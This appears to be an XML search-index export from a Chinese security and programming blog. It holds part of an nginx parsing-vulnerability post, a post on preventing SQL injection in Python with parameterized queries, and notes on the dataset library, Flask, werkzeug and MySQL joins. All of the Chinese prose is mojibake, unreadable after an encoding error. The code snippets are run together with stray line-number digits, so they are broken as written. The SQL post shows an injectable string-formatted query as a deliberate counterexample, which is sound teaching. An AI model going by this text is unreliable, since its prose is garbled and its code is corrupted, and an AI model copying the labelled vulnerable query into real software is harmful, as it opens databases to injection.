http://www.80sec.com/nginx-securit.htmlhttp://php.net/manual/zh/ini.core.phphttp://www.cnblogs.com/LittleHann/p/4561462.htmlhttp://php.net/manual/zh/install.fpm.configuration.phphttp://php.net/manual/zh/install.fpm.phphttp://segmentfault.com/q/1010000000256516]]></content>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>è§£ææ¼æ´</tag>
        <tag>æ¼æ´åˆ†æ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonå®‰å…¨å¼€å‘ä¹‹SQLæ³¨å…¥]]></title>
    <url>%2F2017%2F11%2F05%2FPython%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[PHPä¸­ä½¿ç”¨çš„é¢„ç¼–è¯‘åœ¨pythonä¸­åŒæ ·é€‚ç”¨ï¼ŒåŒæ ·å¯ä»¥ç”¨é¢„ç¼–è¯‘æ¥é˜²æ­¢pythonç¼–ç ä¸­çš„SQLæ³¨å…¥é—®é¢˜ã€‚ é”™è¯¯ç”¨æ³•ï¼š12sql = &quot;select id,name from user where id = %s and name = %s&quot; % (id, name)cur.execute(sql) è¿™ç§ç”¨æ³•å°±æ˜¯å¸¸è§çš„æ‹¼æ¥å­—ç¬¦ä¸²å¯¼è‡´sqlæ³¨å…¥æ¼æ´çš„äº§ç”Ÿã€‚ æ­£ç¡®ç”¨æ³•ï¼š 12args = (id, name)cur.execute(&apos;select id,name from user where id = %s and name = %s&apos;, args ) ä½¿ç”¨å¦‚æ­¤å‚æ•°å¸¦å…¥æ–¹å¼ï¼Œpythonä¼šè‡ªåŠ¨è¿‡æ»¤argsä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ¶æ­¢SQLæ³¨å…¥çš„äº§ç”Ÿã€‚ execute()å‡½æ•°æœ¬èº«å°±æœ‰æ¥å—SQLè¯­å¥å˜é‡çš„å‚æ•°ä½ï¼Œå¯ä»¥é€šè¿‡pythonè‡ªèº«çš„å‡½æ•°å¤„ç†sqlæ³¨å…¥é—®é¢˜,åªè¦æ­£ç¡®çš„ä½¿ç”¨ï¼ˆå³ï¼šä½¿ç”¨â€é€—å·â€ï¼Œè€Œä¸æ˜¯â€ç™¾åˆ†å·â€ï¼‰å°±å¯ä»¥å¯¹ä¼ å…¥çš„å€¼è¿›è¡Œæ­£ç¡®çš„è½¬ä¹‰ï¼Œä»è€Œé¿å…SQLæ³¨å…¥çš„å‘ç”Ÿã€‚ For Example: 12345678910111213141516import sqlite3con = sqlite3.connect(&quot;:memory:&quot;)cur = con.cursor()cur.execute(&quot;create table people (name, age)&quot;) who = &quot;test&quot;age = 22 # This is the qmark style:cur.execute(&quot;insert into people values (?, ?)&quot;, (who, age)) # And this is the named style:cur.execute(&quot;select * from people where name_last=:who and age=:age&quot;, &#123;&quot;who&quot;: who, &quot;age&quot;: age&#125;) print cur.fetchone() å‚è€ƒæ–‡ç« ï¼šhttp://xlixli.net/?p=377http://www.cnblogs.com/sevck/p/6733702.htmlhttps://crazyof.me/blog/archives/2224.html]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>Python</tag>
        <tag>SQLæ³¨å…¥</tag>
        <tag>å®‰å…¨å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonå¼€å‘ç¬”è®°]]></title>
    <url>%2F2017%2F10%2F17%2FPython%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[è¿‘æœŸå­¦ä¹ å¼€å‘ä¸­é‡åˆ°çš„ä¸€äº›çŸ¥è¯†ï¼Œåšçš„å­¦ä¹ ç¬”è®°ï¼Œåšä¸ªå°è®°å½•ï¼ŒæŒç»­æ›´æ–°ä¸­â€¦ DatasetåŸºäºSQLAlchemyçš„ä¾¿åˆ©å·¥å…·å®˜æ–¹æ–‡æ¡£ æ•°æ®é›†ä½¿å¾—æ•°æ®åº“ä¸­çš„æ•°æ®è¯»å–å’Œå†™å…¥æ•°æ®å°±åƒé˜…è¯»å’Œç¼–å†™JSONæ–‡ä»¶ä¸€æ ·ç®€å•ã€‚ datasetå¯¹äºæ“ä½œJSONã€CSVæ–‡ä»¶ã€NoSQLéå¸¸å¥½ç”¨ã€‚ import dataset è¿æ¥MySQLæ•°æ®åº“ï¼š 123456db = dataset.connect(&apos;mysql://username:password@10.10.10.10/ctf?charset=utf8&apos;)ç”¨æˆ·å:usernameï¼Œå¯†ç :passwordï¼Œæ•°æ®åº“åœ°å€(åœ°å€+ç«¯å£):10.10.10.10ï¼Œdatabaseå: ctfè¿æ¥SQLiteæ•°æ®åº“ï¼šdb = dataset.connect(&apos;sqlite:///ctf.db&apos;)è¿æ¥PostgreSQLæ•°æ®åº“ï¼šdb = dataset.connect(&apos;postgresql://scott:tiger@localhost:5432/mydatabase&apos;) ä¸€å®šè¦æ³¨æ„æŒ‡å®šå­—ç¬¦ç¼–ç  12345678table = db[&apos;city&apos;] #ï¼ˆé€‰æ‹©cityè¡¨ï¼‰user = table(&apos;name&apos;) # æ‰¾å‡ºè¡¨ä¸­&apos;name&apos;åˆ—å±æ€§æ‰€æœ‰æ•°æ®res = db.query(&apos;select name from table limit 10&apos;) # å¦‚æœä¸éœ€è¦æŸ¥çœ‹å…¨éƒ¨æ•°æ®çš„è¯æœ€å¥½ç”¨limitï¼Œå› ä¸ºå…¨éƒ¨æ•°æ®çš„è½½å…¥éå¸¸éå¸¸è€—æ—¶é—´for x in res: print x[&apos;name&apos;] # é€‰nameå­—æ®µçš„æ•°æ®table.insert(dict(name=&apos;John Doe&apos;, age=37))table.insert(dict(name=&apos;Jane Doe&apos;, age=34, gender=&apos;female&apos;))john = table.find_one(name=&apos;John Doe&apos;) åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰åŒæ—¶æ»¡è¶³å¤šä¸ªæ¡ä»¶çš„æ•°æ®ï¼štable.find_one(å±æ€§1=å±æ€§å€¼1, å±æ€§2=å±æ€§å€¼2, ...) æ³¨ï¼šfind_oneé€Ÿåº¦å¾ˆæ…¢ æ’å…¥æ•°æ®datasetä¼šæ ¹æ®è¾“å…¥è‡ªåŠ¨åˆ›å»ºè¡¨å’Œå­—æ®µå 12345table = db[&apos;user&apos;]# æˆ–è€…table = db.get_table(&apos;user&apos;)table.insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))table.insert(dict(name=&apos;Jane Doe&apos;, age=37, country=&apos;France&apos;, gender=&apos;female&apos;))# ä¸»é”®idè‡ªåŠ¨ç”Ÿæˆ æ›´æ–°æ•°æ®12table.update(dict(name=&apos;John Doe&apos;, age=47), [&apos;name&apos;])# ç¬¬äºŒä¸ªå‚æ•°ç›¸å½“äºsql updateè¯­å¥ä¸­çš„whereï¼Œç”¨æ¥è¿‡æ»¤å‡ºéœ€è¦æ›´æ–°çš„è®°å½• äº‹åŠ¡æ“ä½œäº‹åŠ¡æ“ä½œå¯ä»¥ç®€å•çš„ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨æ¥å®ç°,å‡ºç°å¼‚å¸¸ï¼Œå°†ä¼šå›æ»š 12345678910111213141516with dataset.connect() as tx: tx[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))# ç›¸å½“äºï¼šdb = dataset.connect()db.begin()try: db[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;)) db.commit()except: db.rollback()# ä¹Ÿå¯ä»¥åµŒå¥—ä½¿ç”¨:db = dataset.connect()with db as tx1: tx1[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;)) with db as tx2: tx2[&apos;user&apos;].insert(dict(name=&apos;Jane Doe&apos;, age=37, country=&apos;France&apos;, gender=&apos;female&apos;)) ä»è¡¨è·å–æ•°æ®12345users = db[&apos;user&apos;].all()for user in db[&apos;user&apos;]: # print(user[&apos;age&apos;]) # chinese_users = user.find(country=&apos;China&apos;) john = user.find_one(name=&apos;John Doe&apos;) è·å–éé‡å¤æ•°æ® db[&#39;user&#39;].distinct(&#39;country&#39;) åˆ é™¤è®°å½•1table.delete(place=&apos;Berlin&apos;) æ‰§è¡ŒSQLè¯­å¥123result = db.query(&apos;SELECT country, COUNT(*) c FROM user GROUP BY country&apos;)for row in result: print(row[&apos;country&apos;], row[&apos;c&apos;]) å¯¼å‡ºæ•°æ®12result = db[&apos;users&apos;].all()dataset.freeze(result, format=&apos;json&apos;, filename=&apos;users.json&apos;) JSONJSON(JavaScript Object Notation) æ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œéå¸¸æ˜“äºäººé˜…è¯»å’Œç¼–å†™ã€‚ 123import jsonjson.dumps å°† Python å¯¹è±¡ç¼–ç æˆ JSON å­—ç¬¦ä¸²json.loads å°†å·²ç¼–ç çš„ JSON å­—ç¬¦ä¸²è§£ç ä¸º Python å¯¹è±¡ MySQLæ•°æ®åº“ï¼šåˆ†ç±»è¡¨-categoriesï¼ŒåŒ…æ‹¬ç±»åˆ«web,reversingï¼Œcrypto(åŠ è§£å¯†),micç­‰ é¢˜ç›®è¡¨-tasks,åŒ…æ‹¬é¢˜ç›®idï¼Œé¢˜ç›®åï¼Œflag,åˆ†å€¼ï¼Œæ–‡ä»¶&amp;åœ°å€ï¼Œé¢˜ç›®ç­‰çº§ï¼Œé¢˜ç›®è¯¦ç»†æè¿° flagè¡¨-flag,åŒ…æ‹¬é¢˜ç›®id,ç”¨æˆ·id,å¾—åˆ†ï¼Œæ—¶é—´æˆ³ ç”¨æˆ·è¡¨-usersï¼ŒåŒ…æ‹¬ç”¨æˆ·id,ç”¨æˆ·åï¼Œå¯†ç  é¢˜ç›®åˆ†ç±»è¡¨-cat_task,åŒ…æ‹¬é¢˜ç›®id,é¢˜ç›®ç±»åˆ«id flagè¡¨ä¸­æ¯æ¡æ•°æ®ç”±äºæ˜¯æœ‰é¢˜ç›®ID task_idå’Œç”¨æˆ·ID user_idæ¥å…±åŒç¡®è®¤çš„ï¼Œæ‰€ä»¥é‡‡ç”¨å¤åˆä¸»é”®ï¼šprimary key (task_id,user_id) è”åˆä¸»é”®å’Œå¤åˆä¸»é”®çš„åŒºåˆ« pythonè£…é¥°å™¨Decoratoré€šè¿‡è¿”å›åŒ…è£…å¯¹è±¡å®ç°é—´æ¥è°ƒç”¨,ä»¥æ­¤æ’å…¥é¢å¤–é€»è¾‘ https://www.zhihu.com/question/26930016 wrapsæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒèƒ½æŠŠåŸå‡½æ•°çš„å…ƒä¿¡æ¯æ‹·è´åˆ°è£…é¥°å™¨å‡½æ•°ä¸­ï¼Œè¿™ä½¿å¾—è£…é¥°å™¨å‡½æ•°ä¹Ÿæœ‰å’ŒåŸå‡½æ•°ä¸€æ ·çš„å…ƒä¿¡æ¯äº† 123456789101112131415from functools import wrapsdef logged(func): @wraps(func) def with_logging(*args,**kwargs): print func.__name__ + &quot;was called&quot; return func(*args,**kwargs) return with_logging@loggeddef f(x): &quot;&quot;&quot;does some math&quot;&quot;&quot; return x + x * xprint f.__name__ # prints &apos;f&apos;print f.__doc__ # prints &apos;does some math&apos; webæ¡†æ¶é‡‡ç”¨flaskfrom flask import Flask å¼•å…¥Flaskç±»ï¼ŒFlaskç±»å®ç°äº†ä¸€ä¸ªWSGI(Web Server Gateway Interface)åº”ç”¨ app = Flask(__name__) appæ˜¯Flaskçš„å®ä¾‹ï¼Œå®ƒæ¥æ”¶åŒ…æˆ–è€…æ¨¡å—çš„åå­—ä½œä¸ºå‚æ•°ï¼Œä½†ä¸€èˆ¬éƒ½æ˜¯ä¼ é€’__name__ 123@app.route(&apos;/&apos;)def hello_world(): return &apos;Hello World!&apos; ä½¿ç”¨app.routeè£…é¥°å™¨ä¼šå°†URLå’Œæ‰§è¡Œçš„è§†å›¾å‡½æ•°çš„å…³ç³»ä¿å­˜åˆ°app.url_mapå±æ€§ä¸Šã€‚å¤„ç†URLå’Œè§†å›¾å‡½æ•°çš„å…³ç³»çš„ç¨‹åºå°±æ˜¯è·¯ç”±ï¼Œè¿™é‡Œçš„è§†å›¾å‡½æ•°å°±æ˜¯hello_world 12if __name__ == &apos;__main__&apos;: app.run(host=&apos;0.0.0.0&apos;,port=9000) ä½¿ç”¨è¿™ä¸ªåˆ¤æ–­å¯ä»¥ä¿è¯å½“å…¶ä»–æ–‡ä»¶å¼•ç”¨è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼ˆä¾‹å¦‚from hello import appï¼‰ä¸ä¼šæ‰§è¡Œè¿™ä¸ªåˆ¤æ–­å†…çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šæ‰§è¡Œapp.runå‡½æ•°ã€‚ æ‰§è¡Œapp.runå°±å¯ä»¥å¯åŠ¨æœåŠ¡äº†ã€‚é»˜è®¤Flaskåªç›‘å¬è™šæ‹Ÿæœºçš„æœ¬åœ°127.0.0.1è¿™ä¸ªåœ°å€ï¼Œç«¯å£ä¸º5000ã€‚è€Œæˆ‘ä»¬å¯¹è™šæ‹Ÿæœºåšçš„ç«¯å£è½¬å‘ç«¯å£æ˜¯9000ï¼Œæ‰€ä»¥éœ€è¦åˆ¶å®šhostå’Œportå‚æ•°ï¼Œ0.0.0.0è¡¨ç¤ºç›‘å¬æ‰€æœ‰åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœ¬æœºè®¿é—®äº†ã€‚ æœåŠ¡å™¨å¯åŠ¨åï¼Œä¼šè°ƒç”¨werkzeug.serving.run_simpleè¿›å…¥è½®è¯¢ï¼Œé»˜è®¤ä½¿ç”¨å•è¿›ç¨‹å•çº¿ç¨‹çš„werkzeug.serving.BaseWSGIServerå¤„ç†è¯·æ±‚ï¼Œå®é™…ä¸Šè¿˜æ˜¯ä½¿ç”¨æ ‡å‡†åº“BaseHTTPServer.HTTPServerï¼Œé€šè¿‡select.selectåš0.5ç§’çš„while TRUEçš„äº‹ä»¶è½®è¯¢ã€‚å½“æˆ‘ä»¬è®¿é—®http://127.0.0.1:9000/,é€šè¿‡app.url_mapæ‰¾åˆ°æ³¨å†Œçš„/è¿™ä¸ªURLæ¨¡å¼,å°±æ‰¾åˆ°äº†å¯¹åº”çš„hello_worldå‡½æ•°æ‰§è¡Œï¼Œè¿”å›hello world!,çŠ¶æ€ç ä¸º200ã€‚å¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ï¼Œå¦‚è®¿é—®http://127.0.0.1:9000/a,Flaskæ‰¾ä¸åˆ°å¯¹åº”çš„æ¨¡å¼ï¼Œå°±ä¼šå‘æµè§ˆå™¨è¿”å›Not Foundï¼ŒçŠ¶æ€ç ä¸º404 flaskä¸­jsonifyçš„ä½œç”¨jsonifyçš„ä½œç”¨å®é™…ä¸Šå°±æ˜¯å°†æˆ‘ä»¬ä¼ å…¥çš„jsonå½¢å¼æ•°æ®åºåˆ—åŒ–æˆä¸ºjsonå­—ç¬¦ä¸²ï¼Œä½œä¸ºå“åº”çš„bodyï¼Œå¹¶ä¸”è®¾ç½®å“åº”çš„Content-Typeä¸ºapplication/jsonï¼Œæ„é€ å‡ºå“åº”è¿”å›è‡³å®¢æˆ·ç«¯ æ•ˆæœç­‰äºjson.dumps jsonifyçš„Content-Typeå­—æ®µå€¼ä¸ºapplication/json json.dumpsçš„Content-Typeå­—æ®µå€¼ä¸ºtext/html ä¿®æ”¹flaskä¸­é™æ€æ–‡ä»¶å¤¹ä¿®æ”¹çš„flaské»˜è®¤çš„staticæ–‡ä»¶å¤¹åªéœ€è¦åœ¨åˆ›å»ºFlaskå®ä¾‹çš„æ—¶å€™,æŠŠstatic_folderå’Œstatic_url_pathå‚æ•°è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²å³å¯ã€‚ app = Flask(__name__, static_folder=&#39;&#39;, static_url_path=&#39;&#39;) è®¿é—®çš„æ—¶å€™ç”¨url_forå‡½æ•°ï¼Œresæ–‡ä»¶å¤¹å’Œstaticæ–‡ä»¶å¤¹åŒä¸€çº§ï¼š url_for(&#39;static&#39;, filename=&#39;res/favicon.ico&#39;) werkzeugwerkzeugæ˜¯ä¸€ä¸ªWSGIå·¥å…·åŒ…ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªWebæ¡†æ¶çš„åº•å±‚åº“ã€‚å®ƒå°è£…å¥½äº†å¾ˆå¤šWebæ¡†æ¶çš„ä¸œè¥¿ï¼Œä¾‹å¦‚ Requestï¼ŒResponseç­‰ç­‰ã€‚Flaskæ¡†æ¶å°±æ˜¯ä¸€Werkzeug ä¸ºåŸºç¡€å¼€å‘çš„ generate_password_hash(password)å°†ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç åŠ å¯†æˆå¯†æ–‡è¿›è¡Œå­˜å‚¨ å¯†ç åŠ ç›å“ˆå¸Œå‡½æ•°ã€‚ç”¨æ¥å°†æ˜æ–‡å¯†ç åŠ å¯†ï¼Œè¿”å›åŠ å¯†åçš„å¯†æ–‡ï¼Œç”¨æ¥è¿›è¡Œç”¨æˆ·æ³¨å†Œ å‡½æ•°å®šä¹‰ï¼š 12345678werkzeug.security.generate_password_hash(password, method=&apos;pbkdf2:sha1&apos;, salt_length=8)å¯†æ–‡æ ¼å¼ï¼šmethod$salt$hashpassword: æ˜æ–‡å¯†ç method: å“ˆå¸Œçš„æ–¹å¼ï¼ˆéœ€è¦æ˜¯hashlibåº“æ”¯æŒçš„ï¼‰ï¼Œæ ¼å¼ä¸ºpbpdf2:&lt;method&gt;[:iterations]ã€‚å‚æ•°è¯´æ˜ï¼š methodï¼šå“ˆå¸Œçš„æ–¹å¼ï¼Œä¸€èˆ¬ä¸ºSHA1ï¼Œ iterationsï¼šï¼ˆå¯é€‰å‚æ•°ï¼‰è¿­ä»£æ¬¡æ•°ï¼Œé»˜è®¤ä¸º1000ã€‚slat_length: ç›å€¼çš„é•¿åº¦ï¼Œé»˜è®¤ä¸º8 check_password_hash(hash,password)éªŒè¯ç»è¿‡generate_password_hashå“ˆå¸Œçš„å¯†ç ï¼Œå°†æ˜æ–‡å’Œå¯†æ–‡è¿›è¡Œæ¯”è¾ƒ,æŸ¥çœ‹æ˜¯å¦ä¸€è‡´ï¼Œç”¨æ¥éªŒè¯ç”¨æˆ·ç™»å½• å‡½æ•°å®šä¹‰ï¼š 123werkzeug.security.check_password_hash(pwhash, password)pwhash: generate_password_hashç”Ÿæˆçš„å“ˆå¸Œå­—ç¬¦ä¸²password: éœ€è¦éªŒè¯çš„æ˜æ–‡å¯†ç  flaskä¸­çš„session123from flask import sessionuser = db[&apos;users&apos;].find_one(username=username)session[&apos;user_id&apos;] = user[&apos;id&apos;] ç”±äºä½¿ç”¨äº†sessionï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®ä¸€ä¸ªsecret_keyç”¨æ¥åšä¸€äº›æ¨¡å—çš„hashFlask Web Development ä¸­çš„å†…å®¹: SECRET_KEYé…ç½®å˜é‡æ˜¯é€šç”¨å¯†é’¥,å¯åœ¨Flaskå’Œå¤šä¸ªç¬¬ä¸‰æ–¹æ‰©å±•ä¸­ä½¿ç”¨ã€‚å¦‚å…¶åæ‰€ç¤º,åŠ å¯†çš„å¼ºåº¦å–å†³äºå˜é‡å€¼çš„æœºå¯†åº¦ã€‚ä¸åŒçš„ç¨‹åºè¦ä½¿ç”¨ä¸åŒçš„å¯†é’¥,è€Œä¸”è¦ä¿è¯å…¶ä»–äººä¸çŸ¥é“ä½ æ‰€ç”¨çš„å­—ç¬¦ä¸²ã€‚ SECRET_KEYçš„ä½œç”¨ä¸»è¦æ˜¯æä¾›ä¸€ä¸ªå€¼åšå„ç§HASH, æ˜¯åœ¨å…¶åŠ å¯†è¿‡ç¨‹ä¸­ä½œä¸ºç®—æ³•çš„ä¸€ä¸ªå‚æ•°(saltæˆ–å…¶ä»–)ã€‚æ‰€ä»¥è¿™ä¸ªå€¼çš„å¤æ‚åº¦ä¹Ÿå°±å½±å“åˆ°äº†æ•°æ®ä¼ è¾“å’Œå­˜å‚¨æ—¶çš„å¤æ‚åº¦ã€‚ flask å˜é‡è§„åˆ™è¦ç»™URLæ·»åŠ å˜é‡éƒ¨åˆ†ï¼Œä½ å¯ä»¥æŠŠè¿™äº›ç‰¹æ®Šçš„å­—æ®µæ ‡è®°ä¸º&lt;variable_name&gt;ï¼Œ è¿™ä¸ªéƒ¨åˆ†å°†ä¼šä½œä¸ºå‘½åå‚æ•°ä¼ é€’åˆ°ä½ çš„å‡½æ•°ã€‚è§„åˆ™å¯ä»¥ç”¨&lt;converter:variable_name&gt;æŒ‡å®šä¸€ä¸ªå¯é€‰çš„è½¬æ¢å™¨ 123@route(&apos;/hello/&lt;name&gt;&apos;)def index(name): return &apos;&lt;b&gt;Hello &#123;&#123;name&#125;&#125;&lt;/b&gt;!&apos; æ•°æ®åº“æŸ¥è¯¢å¯¹datasetçš„æ•°æ®æŸ¥è¯¢ï¼Œä½¿ç”¨å†’å·æ¥ä¸ºå˜é‡ä¼ å‚ã€‚ select f.task_id from flags f where f.user_id = :user_id&#39;&#39;&#39;,user_id=session[&#39;user_id&#39;]) æ¨¡æ¿æ¸²æŸ“ä½¿ç”¨render_templateæ–¹æ³•æ¥æ¸²æŸ“æ¨¡æ¿ã€‚å°†æ¨¡æ¿åå’Œä½ æƒ³ä½œä¸ºå…³é”®å­—çš„å‚æ•°ä¼ å…¥æ¨¡æ¿çš„å˜é‡ MySQLIFNULL(expr1,expr2) å¦‚æœexpr1ä¸æ˜¯NULLï¼ŒIFNULL()è¿”å›expr1ï¼Œå¦åˆ™å®ƒè¿”å›expr2ã€‚ IFNULL()è¿”å›ä¸€ä¸ªæ•°å­—æˆ–å­—ç¬¦ä¸²å€¼ï¼Œå–å†³äºå®ƒè¢«ä½¿ç”¨çš„ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚ maxå‡½æ•°æ˜¯ç”¨æ¥æ‰¾å‡ºè®°å½•é›†ä¸­æœ€å¤§å€¼çš„è®°å½• 121. å¯¹äºleft joinï¼Œä¸ç®¡onåé¢è·Ÿä»€ä¹ˆæ¡ä»¶ï¼Œå·¦è¡¨çš„æ•°æ®å…¨éƒ¨æŸ¥å‡ºæ¥ï¼Œå› æ­¤è¦æƒ³è¿‡æ»¤éœ€æŠŠæ¡ä»¶æ”¾åˆ°whereåé¢2. å¯¹äºinner joinï¼Œæ»¡è¶³onåé¢çš„æ¡ä»¶è¡¨çš„æ•°æ®æ‰èƒ½æŸ¥å‡ºï¼Œå¯ä»¥èµ·åˆ°è¿‡æ»¤ä½œç”¨ã€‚ä¹Ÿå¯ä»¥æŠŠæ¡ä»¶æ”¾åˆ°whereåé¢ åœ¨ä½¿ç”¨left jionæ—¶ï¼Œonå’Œwhereæ¡ä»¶çš„åŒºåˆ«å¦‚ä¸‹ï¼š 121ã€ onæ¡ä»¶æ˜¯åœ¨ç”Ÿæˆä¸´æ—¶è¡¨æ—¶ä½¿ç”¨çš„æ¡ä»¶ï¼Œå®ƒä¸ç®¡onä¸­çš„æ¡ä»¶æ˜¯å¦ä¸ºçœŸï¼Œéƒ½ä¼šè¿”å›å·¦è¾¹è¡¨ä¸­çš„è®°å½•ã€‚2ã€whereæ¡ä»¶æ˜¯åœ¨ä¸´æ—¶è¡¨ç”Ÿæˆå¥½åï¼Œå†å¯¹ä¸´æ—¶è¡¨è¿›è¡Œè¿‡æ»¤çš„æ¡ä»¶ã€‚è¿™æ—¶å·²ç»æ²¡æœ‰left joinçš„å«ä¹‰ï¼ˆå¿…é¡»è¿”å›å·¦è¾¹è¡¨çš„è®°å½•ï¼‰äº†ï¼Œæ¡ä»¶ä¸ä¸ºçœŸçš„å°±å…¨éƒ¨è¿‡æ»¤æ‰ã€‚ order byçš„ç”¨æ³• 123456ä½¿ç”¨order byï¼Œä¸€èˆ¬æ˜¯ç”¨æ¥ï¼Œä¾ç…§æŸ¥è¯¢ç»“æœçš„æŸä¸€åˆ—ï¼ˆæˆ–å¤šåˆ—ï¼‰å±æ€§ï¼Œè¿›è¡Œæ’åºï¼ˆå‡åºï¼šASCï¼›é™åºï¼šDESCï¼›é»˜è®¤ä¸ºå‡åºï¼‰ã€‚å½“æ’åºåˆ—å«ç©ºå€¼æ—¶ï¼šASCï¼šæ’åºåˆ—ä¸ºç©ºå€¼çš„å…ƒç»„æœ€åæ˜¾ç¤ºã€‚DESCï¼šæ’åºåˆ—ä¸ºç©ºå€¼çš„å…ƒç»„æœ€å…ˆæ˜¾ç¤ºã€‚å¯ä»¥æŠŠnullå€¼çœ‹åšæ— ç©·å¤§select * from s order by sno desc, sage asc group byçš„ç”¨æ³• 123456789101112131415161718group byæŒ‰ç…§æŸ¥è¯¢ç»“æœé›†ä¸­çš„æŸä¸€åˆ—ï¼ˆæˆ–å¤šåˆ—ï¼‰ï¼Œè¿›è¡Œåˆ†ç»„ï¼Œå€¼ç›¸ç­‰çš„ä¸ºä¸€ç»„1ã€ç»†åŒ–é›†å‡½æ•°ï¼ˆcountï¼Œsumï¼Œavgï¼Œmaxï¼Œminï¼‰çš„ä½œç”¨å¯¹è±¡ï¼šæœªå¯¹æŸ¥è¯¢ç»“æœåˆ†ç»„ï¼Œé›†å‡½æ•°å°†ä½œç”¨äºæ•´ä¸ªæŸ¥è¯¢ç»“æœã€‚å¯¹æŸ¥è¯¢ç»“æœåˆ†ç»„åï¼Œé›†å‡½æ•°å°†åˆ†åˆ«ä½œç”¨äºæ¯ä¸ªç»„ã€‚SELECT cno,count(sno) from sc group by cno2ã€GROUP BYå­å¥çš„ä½œç”¨å¯¹è±¡æ˜¯æŸ¥è¯¢çš„ä¸­é—´ç»“æœè¡¨åˆ†ç»„æ–¹æ³•ï¼šæŒ‰æŒ‡å®šçš„ä¸€åˆ—æˆ–å¤šåˆ—å€¼åˆ†ç»„ï¼Œå€¼ç›¸ç­‰çš„ä¸ºä¸€ç»„ã€‚ä½¿ç”¨GROUP BYå­å¥åï¼ŒSELECTå­å¥çš„åˆ—ååˆ—è¡¨ä¸­åªèƒ½å‡ºç°åˆ†ç»„å±æ€§ï¼ˆæ¯”å¦‚ï¼šsnoï¼‰å’Œé›†å‡½æ•°ï¼ˆæ¯”å¦‚ï¼šcountï¼ˆï¼‰ï¼‰select sno,count(cno) from sc group by sno3ã€å¤šä¸ªåˆ—å±æ€§è¿›è¡Œåˆ†ç»„select cno,grade,count(cno) from sc group by cno,grade4ã€ä½¿ç”¨HAVINGçŸ­è¯­ç­›é€‰æœ€ç»ˆè¾“å‡ºç»“æœåªæœ‰æ»¡è¶³HAVINGçŸ­è¯­æŒ‡å®šæ¡ä»¶çš„ç»„æ‰è¾“å‡ºã€‚HAVINGçŸ­è¯­ä¸WHEREå­å¥çš„åŒºåˆ«ï¼šä½œç”¨å¯¹è±¡ä¸åŒã€‚1ã€WHEREå­å¥ä½œç”¨äºåŸºè¡¨æˆ–è§†å›¾ï¼Œä»ä¸­é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„å…ƒç»„ã€‚2ã€HAVINGçŸ­è¯­ä½œç”¨äºç»„ï¼Œä»ä¸­é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„ç»„select sno from sc group by sno having count(cno)&gt;3select sno,count(cno) from sc where grade&gt;60 group by sno having count(cno)&gt;3 MySQLçš„å·¦è¿æ¥ã€å³è¿æ¥ã€ç­‰å€¼è¿æ¥1.å·¦è¿æ¥ï¼ˆleft join ï¼‰123select m.columnnameâ€¦â€¦,n.* columnnameâ€¦..from left_table m left join right_table n on m.columnname_join=n.columnname_join and n.columnname=xxxwhere m.columnname=xxxâ€¦.. ONæ˜¯è¿æ¥æ¡ä»¶ï¼Œç”¨äºæŠŠ2è¡¨ä¸­ç­‰å€¼çš„è®°å½•è¿æ¥åœ¨ä¸€èµ·ï¼Œä½†æ˜¯ä¸å½±å“è®°å½•é›†çš„æ•°é‡ã€‚è‹¥æ˜¯è¡¨left_tableä¸­çš„æŸè®°å½•ï¼Œæ— æ³•åœ¨è¡¨right_tableæ‰¾åˆ°å¯¹åº”çš„è®°å½•ï¼Œåˆ™æ­¤è®°å½•ä¾ç„¶æ˜¾ç¤ºåœ¨è®°å½•é›†ä¸­ï¼Œåªæ˜¯è¡¨right_tableéœ€è¦åœ¨æŸ¥è¯¢æ˜¾ç¤ºçš„åˆ—çš„å€¼ç”¨NULLæ›¿ä»£ï¼› ONè¿æ¥æ¡ä»¶ä¸­è¡¨n.columnname=xxxç”¨äºæ§åˆ¶right_tableè¡¨æ˜¯å¦æœ‰ç¬¦åˆè¦æ±‚çš„åˆ—å€¼è¿˜æ˜¯ç”¨NULLæ›¿æ¢çš„æ–¹å¼æ˜¾ç¤ºåœ¨æŸ¥è¯¢åˆ—ä¸­ï¼Œä¸å½±å“è®°å½•é›†çš„æ•°é‡ï¼› WHEREå­—å¥æ§åˆ¶è®°å½•æ˜¯å¦ç¬¦åˆæŸ¥è¯¢è¦æ±‚ï¼Œä¸ç¬¦åˆåˆ™è¿‡æ»¤æ‰ 2.å³è¿æ¥ï¼ˆright joinï¼‰123select m.columnnameâ€¦â€¦,n.* columnnameâ€¦..from left_table m right join right_table n on m. columnname_join=n. columnname_join and m. columnname=xxxwhere n.columnname=xxxâ€¦.. 3.ç­‰å€¼è¿æ¥12345678select m.columnnameâ€¦â€¦,n.* columnnameâ€¦..from left_table m [inner] join right_table n on m. columnname_join=n. 